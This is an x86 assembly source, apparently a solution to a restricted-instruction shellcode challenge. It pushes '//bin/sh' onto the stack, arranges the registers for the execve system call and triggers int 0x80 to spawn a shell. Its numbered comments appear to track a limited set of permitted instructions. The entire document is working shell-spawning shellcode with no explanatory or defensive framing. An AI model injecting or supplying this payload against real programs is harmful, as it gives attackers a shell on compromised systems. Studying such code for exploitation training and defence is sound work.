	global _start
	section .text

_start:
	;; execve("/bin/sh", NULL)
	;; eax=0xb, ebx=addr, ecx=esp, edx=0x0
	;; 9
	push esp
	push ebp
	;; 1
	pop ebx
	pop ebp
	xor eax, eax		; make 0x0
	;; 13
	push eax		; for later pop edx=0x0
	;; 10 -> /bin/sh
	push 0x68732f6e 
	push 0x69622f2f
	;; 9
	push esp
	push ebp
	;; 2
	sub ecx, eax
	pop ebp
	;; 7
	add ecx, eax
	pop ebx			; now ebx=addr
	;; 13
	push eax		; push execve 2nd argv = 0x0

	;; 9
	push esp
	push ebp
	;; 4
	pop ecx
	pop eax
	;; 13
	push eax		; push execve 1st argv = addr

	;; 12
	push 1
	push 2
	;; 4
	pop ecx
	pop eax
	;; 8*5 -> 1+2*5
	add eax, 0x2
	add eax, 0x2
	add eax, 0x2
	add eax, 0x2
	add eax, 0x2		; now eax=0xb

	;; 9
	push esp
	push ebp
	;; 6
	pop edx
	pop ecx			; now ecx=esp
	pop edx			; now edx=0x0
	
	;; 0
	int 0x80
	pop ebp
	pop edi
	pop esi
	pop ebx
